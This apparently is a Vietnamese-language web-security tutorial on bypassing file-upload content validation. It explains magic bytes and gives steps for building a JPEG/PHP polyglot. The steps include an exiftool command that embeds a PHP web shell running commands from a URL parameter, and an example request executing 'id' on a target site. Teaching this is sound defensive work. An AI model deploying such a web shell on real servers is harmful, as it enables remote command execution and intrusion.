# Flawed Validation (Lỗi xác thực nội dung tệp)

## Mô tả

Thay vì tin tưởng một cách ngầm định vào thông tin `Content-Type` được chỉ định trong yêu cầu, các máy chủ bảo mật hơn sẽ cố gắng xác minh xem nội dung của tệp có thực sự khớp với những gì được mong đợi hay không.

Trong trường hợp chức năng tải ảnh lên, máy chủ có thể cố gắng xác minh một số thuộc tính nội tại của ảnh, chẳng hạn như kích thước. Ví dụ, nếu bạn cố gắng tải lên một tập lệnh PHP, nó sẽ không có bất kỳ kích thước nào. Do đó, máy chủ có thể suy ra rằng nó không thể là một hình ảnh và từ chối việc tải lên.

Tương tự, một số loại tệp nhất định luôn chứa một chuỗi byte cụ thể trong phần đầu hoặc cuối tệp (Magic Bytes). Những chuỗi byte này có thể được sử dụng như dấu vân tay hoặc chữ ký để xác định xem nội dung có khớp với loại tệp dự kiến ​​hay không. Ví dụ, các tệp JPEG luôn bắt đầu bằng các byte `FF D8 FF`.

Tuy nhiên, ngay cả phương pháp này cũng không hoàn toàn an toàn. Sử dụng các công cụ đặc biệt, chẳng hạn như ExifTool, việc tạo ra một tệp JPEG đa ngôn ngữ (polyglot) chứa mã độc hại trong siêu dữ liệu của nó là điều rất dễ dàng.

### Các bước thực hiện

Để khai thác lỗ hổng này bằng cách tạo một file Polyglot (vừa là ảnh hợp lệ, vừa chứa mã độc PHP):

1.  **Chuẩn bị**:

    - Một file ảnh hợp lệ (ví dụ: `image.jpg`).
    - Công cụ `ExifTool`.

2.  **Chèn Payload vào Metadata**:
    Sử dụng ExifTool để chèn mã PHP vào phần Comment (hoặc các thẻ metadata khác) của ảnh.

    ```bash
    exiftool -Comment="<?php echo 'Command Execution: '; system(\$_GET['cmd']); ?>" image.jpg -o payload.php
    ```

    _Lệnh này sẽ tạo ra file `payload.php` vẫn giữ nguyên cấu trúc của ảnh JPEG (có magic bytes `FF D8 FF`) nhưng chứa mã PHP trong phần comment._

3.  **Tải lên (Upload)**:

    - Tải file `payload.php` lên chức năng upload của trang web.
    - Vì file có magic bytes của JPEG và có kích thước ảnh hợp lệ, nó có thể vượt qua các bộ lọc kiểm tra nội dung (Content Validation).

4.  **Thực thi (Execute)**:
    - Truy cập đường dẫn của file đã upload.
    - Ví dụ: `http://target-site.com/uploads/payload.php?cmd=id`
    - Server sẽ xử lý file như một script PHP (do đuôi .php) và thực thi mã độc nằm trong metadata.
